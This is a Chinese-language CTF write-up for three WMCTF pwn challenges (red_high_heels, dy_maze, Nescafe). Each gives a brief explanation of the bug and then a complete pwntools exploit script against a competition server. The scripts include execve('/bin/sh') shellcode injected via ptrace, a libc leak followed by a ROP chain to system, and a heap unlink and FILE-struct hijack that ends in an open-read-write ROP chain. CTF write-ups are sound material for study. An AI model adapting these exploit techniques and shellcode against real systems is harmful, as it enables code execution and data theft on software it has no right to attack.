## red_high_heels
题目可以使用 execve，利用子线程启动 redflag 或 👠，另外还能够通过 ptrace 写入 shellcode。
利用点就是，当我们启动 👠，会先调用 clean_resource() 进行清理，然后再执行程序；创建足够多的 redflag，然后再启动 👠，然后修改 pid * 0.9(差不多这附近的一个即可) 的子线程。
本地的话，能够稳定触发 shell，远程的话则由于交互原因，需要多试几次。
```python
#encoding:utf-8
from pwn import *
import re
from Crypto.Util.number import long_to_bytes,bytes_to_long

ip = '47.104.169.32'
port = 12233

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'WMCTF{.*?}'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

def pwn():
        filename = './red_high_heels'
        context(os="linux", arch="amd64", timeout=3)
        shellcode = asm('''
        mov rbx, 0x68732f6e69622f 
    push rbx
    push rsp 
    pop rdi
    xor esi, esi
    xor edx, edx 
    push 0x3b
    pop rax
    syscall
    ''')
        pid = 0x300
        poc = [('%d %d %lu' % (int(pid*0.9), i*8, u64(shellcode[i*8:i*8+8].ljust(0x8, b'\x00')))) for i in range(3)]
        poc_length = len(poc)

        #io = process(filename)
        while True:
                io = remote(ip, port)
                for i in range(pid//0x10):
                        io.sendafter(b'>> ', b'3\nredflag\n'*0x10) 
        
                io.sendafter(b'>> ', '3\n👠\n') 

                io.sendlineafter(b'>> ', b'4') 
                io.sendline(poc[0])
                io.sendlineafter(b'>> ', b'4') 
                io.sendline(poc[1])
                io.sendlineafter(b'>> ', b'4') 
                io.sendline(poc[2])

                sleep(1)
                io.recv(timeout=0.5)
                try:
                        io.sendline(b'cat flag')
                        flag = io.recvuntil(b'}')
                except:
                        io.close()
                        continue

                if b'}' in flag:
                        log.success('flag: %s', regexp_out(flag))
                        exit()
                # WMCTF{C4rol_n0w_g0t_7im3_f0r_th3_pr0m}
                io.close()

if __name__ == '__main__':
        pwn()
```

## dy_maze
虽然这题在pwn里面，但更多的是auto re的味道
在栈溢出前要过80个迷宫，思路是：通过找pos符号的使用，在每一关结束前都会给pos加一，因此就能直接找到迷宫的出口，再在这个位置之前，搜索最近一次的cmp，cmp的常数就是这一关的答案。
最后的栈溢出先泄露libc地址，再调用system("/bin/sh")
```python
import base64
import os
import secrets
import base64
from pwn import *
from LibcSearcher import *
import gmpy2

VERSION = 's'
MODULUS = 2**1279-1
CHALSIZE = 2**128

def sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for _ in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)
def encode_number(num):
    size = (num.bit_length() // 24) * 3 + 3
    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')
def decode_number(enc):
    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')
def decode_challenge(enc):
    dec = enc.split('.')
    if dec[0] != VERSION:
        raise Exception('Unknown challenge version')
    return list(map(decode_number, dec[1:]))
def encode_challenge(arr):
    return '.'.join([VERSION] + list(map(encode_number, arr)))
def solve_challenge(chal):
    [diff, x] = decode_challenge(chal)
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])

def getMazeAns(filename,elf):
    os.system(f"objdump -d {filename} | grep pos > list.txt")
    result_num=[]
    with open('list.txt','r') as f:
        ls=f.readlines()
        assert len(ls)==240
        for i in range(0,len(ls),3):
            base_addr=int(ls[i+1][2:8],16)
            lastByte=elf.read(base_addr-0x20,0x20)
            id=lastByte.rfind(b'\x83\x7d\xfc')
            result_num.append(lastByte[id+3])
            
    os.remove('list.txt')
    addr_list=[]
    for i in range(80):
        addr_list.append((elf.sym[f'maze_{i+1}'],i))

    addr_list=sorted(addr_list,key=lambda i:i[0])
    ans=[0]*80
    for i,j in enumerate(addr_list):
        ans[j[1]]=str(result_num[i])
    print(ans)
    return ' '.join(ans)

def getXorKey(elf:ELF):
    ok_addr=elf.sym['ok_success']
    return elf.read(ok_addr+0xb6,1)+elf.read(ok_addr+0xd7,1)+elf.read(ok_addr+0xf8,1)+elf.read(ok_addr+0x119,1)+elf.read(ok_addr+0x13a,1)

xor=lambda key,inp:bytes([j^key[i%5] for i,j in enumerate(inp)])

p=remote("47.104.169.32",44212)
p.recvuntil("python3 <(curl -sSL https://wmctf.wm-team.cn/pow.py) solve ")
challenge=p.recvline(False).decode()
solution = solve_challenge(challenge)
p.sendline(solution)
p.recvuntil("==== Binary Download Start ====\n")
file_base64=p.recvuntil("==== Binary Download END ====\n",True)
file=base64.b64decode(file_base64)
with open('elf.tar.bz2','wb') as f:
    f.write(file)
os.system("tar -xaf elf.tar.bz2 && rm -f elf.tar.bz2")
filename='./'+input("please input file name: ").strip()

context.binary=filename
context.log_level='debug'
melf=ELF(filename,False)
key=getXorKey(melf)

p.sendline(getMazeAns(filename,melf))
rop1=ROP(melf)
rop1.puts(melf.got['puts'])
rop1.call('ok_success')
rop1=rop1.chain()
p.sendlineafter('Your name length: ',str(28+len(rop1)))
p.sendafter('Input your name: ',xor(key,b'a'*28+rop1))
puts_addr=u64(p.recvline(False).ljust(8,b'\0')[:8])
libc=LibcSearcher().condition('puts',puts_addr).elf()

rop2=ROP(libc)
rop2.call(melf.sym['main']+0x7d) # ret
rop2.system(next(libc.search(b'/bin/sh')))
rop2=rop2.chain()
p.sendlineafter('Your name length: ',str(28+len(rop2)))
p.sendafter('Input your name: ',xor(key,b'a'*28+rop2))
p.interactive()
```

## Nescafe
题目存在 UAF，但是题目只允许我们使用一次 show，而且我们可以控制的 chunk 只有前 5 个，另外还不能够执行 execve。
因此，这里利用 show 泄露 libc，然后通过 unlink 漏洞将 chunk 申请到 `__stdout_FILE`，利用其泄露程序基址和栈地址，然后将 orw ROP 写入并劫持栈帧即可。
```python
#-*- coding:utf8 -*-
from pwn import *

ip = '47.104.169.32'
port = 11543
local = 0
filename = './pwn'
libc_name = './libc.so'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'WMCTF{.*?}'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

def create_connect():
    global io, elf, libc

    elf = ELF(filename)
    context(os=elf.os, arch=elf.arch, timeout=3, log_level=1)
    
    if local:
        io = process(filename)
    else:
        io = remote(ip, port)

    try:
        libc = ELF(libc_name)
    except:
        pass

def add(content):
    sa(b'>>', b'1')
    sa(b'Please input the content', content)

def delete(idx):
    sa(b'>>', b'2')
    sa(b'idx:\n', str(idx).encode())

def show(idx):
    sa(b'>>', b'3')
    sa(b'idx\n', str(idx).encode())
    return ru(b'\nDone')[:-5]

def edit(idx, content):
    sa(b'>>', b'4')
    sa(b'idx:\n', str(idx).encode())
    sa(b'Content\n', content)

def pwn():
    cc()
    add("A"*8)
    bin_c40 = u64(show(0)[-6:].ljust(0x8, b'\x00'))
    log.success('bin_c40: 0x%x', bin_c40)
    mal_address = bin_c40 - 38*0x18
    log.success('mal_address: 0x%x', mal_address)
    libc.address = mal_address - 0x292ac0
    log.success('libc_addr: 0x%x', libc.address)

    bin_220 = mal_address + 384
    environ = libc.sym['environ']
    close = libc.sym['__stdio_close']
    write = libc.sym['__stdio_write']
    seek =  libc.sym['__stdio_seek']
    stdout = libc.sym['__stdout_FILE']
    
    add(b"callmecro")
    delete(0)

    #g('b *$rebase(0xC45)\nb *$rebase(0xD9F)\nb *$rebase(0xE37)\nb *$rebase(0xD30)\nb *$rebase(0xF3F)')
    edit(0, p64(stdout-0x18) + p64(stdout-0x8))
    delete(1)
    edit(0, p64(stdout-0x10) + p64(bin_220))
    add(b"callmecro")#2

    leak = mal_address + 960
    poc = b''
    poc += p64(0x45) # flag
    poc += p64(0) # rpos
    poc += p64(0) # rend
    poc += p64(close) # close
    poc += p64(leak + 8) # wend
    poc += p64(leak + 8) # wpos
    poc += p64(0) # mustbezero_1
    poc += p64(leak) # wbase
    poc += p64(0) # read
    poc += p64(write) # write
    poc += p64(seek) # seek
    poc += p64(leak) # buf
    poc += p64(0) # buf_size
    poc += p64(0) # prev
    poc += p64(0) # next
    poc += p64(1) # fd
    poc += p64(0) # pipe_pid
    poc += p64(0) # lockcount
    poc += p32(0xFFFFFFFF) # mode
    poc += p32(0xFFFFFFFF) # lock
    poc += p32(0xFFFFFFFF) # lbf
    poc += p64(0)*10
    add(poc) #3
    elf.address = u64(io.recvn(7)[-6:].ljust(8, b'\x00')) - 0x203030
    log.success('elf_addr: 0x%x', elf.address)

    leak = environ
    poc = b''
    poc += p64(0x45) # flag
    poc += p64(0) # rpos
    poc += p64(0) # rend
    poc += p64(close) # close
    poc += p64(leak + 8) # wend
    poc += p64(leak + 8) # wpos
    poc += p64(0) # mustbezero_1
    poc += p64(leak) # wbase
    poc += p64(0) # read
    poc += p64(write) # write
    poc += p64(seek) # seek
    poc += p64(leak) # buf
    poc += p64(0) # buf_size
    poc += p64(0) # prev
    poc += p64(0) # next
    poc += p64(1) # fd
    poc += p64(0) # pipe_pid
    poc += p64(0) # lockcount
    poc += p32(0xFFFFFFFF) # mode
    poc += p32(0xFFFFFFFF) # lock
    poc += p32(0xFFFFFFFF) # lbf
    poc += p64(0)*10

    #g('b *$rebase(0xC45)\nb *$rebase(0xD9F)\nb *$rebase(0xE37)\nb *$rebase(0xD30)\nb *$rebase(0xF3F)')
    edit(3, poc)
    stack_addr = u64(ru(b'\x7f').ljust(0x8, b'\x00'))
    log.success('stack_addr: 0x%x', stack_addr)

    #g('b *$rebase(0xC45)\nb *$rebase(0xD9F)\nb *$rebase(0xE37)\nb *$rebase(0xD30)\nb *$rebase(0xF3F)')
    edit(3, p64(0) + p64(elf.address + 0x202030) + p64(bin_220))
    add(p64(0)*2) # 4
    add(p64(0)*2 + p64(stack_addr - 0x78)) # 5
    
    pop_rax = libc.address + 0x1b826
    pop_rdi = libc.address + 0x14862
    pop_rsi = libc.address + 0x1c237
    pop_rdx = libc.address + 0x1bea2
    syscall = libc.address + 0x234af

    filename = stack_addr - 0x78
    flag_addr = elf.bss() + 0x100

    poc = b''
    poc += b'/flag\x00\x00\x00'

    poc += p64(pop_rdi)
    poc += p64(filename)
    poc += p64(pop_rsi)
    poc += p64(0)
    poc += p64(pop_rdx)
    poc += p64(0)
    poc += p64(pop_rax)
    poc += p64(2)
    poc += p64(syscall)
   
    poc += p64(pop_rdi)
    poc += p64(0x3)
    poc += p64(pop_rsi)
    poc += p64(flag_addr)
    poc += p64(pop_rdx)
    poc += p64(0x60)
    poc += p64(pop_rax)
    poc += p64(0)
    poc += p64(syscall)
    
    poc += p64(pop_rdi)
    poc += p64(0x1)
    poc += p64(pop_rsi)
    poc += p64(flag_addr)
    poc += p64(pop_rdx)
    poc += p64(0x60)
    poc += p64(pop_rax)
    poc += p64(1)
    poc += p64(syscall)

    #g('b *$rebase(0xC45)\nb *$rebase(0xD9F)\nb *$rebase(0xE37)\nb *$rebase(0xD30)\nb *$rebase(0xF3F)')
    edit(2, poc)
    log.success("flag: %s", regexp_out(ru(b'}')))
    cl()

if __name__ == "__main__":
    pwn()
```
这种将 chunk 写到栈和 nodeList 的方法说实话比较麻烦，还有一种比较简单的方法就是利用栈迁移操作。
```python
待补充
```
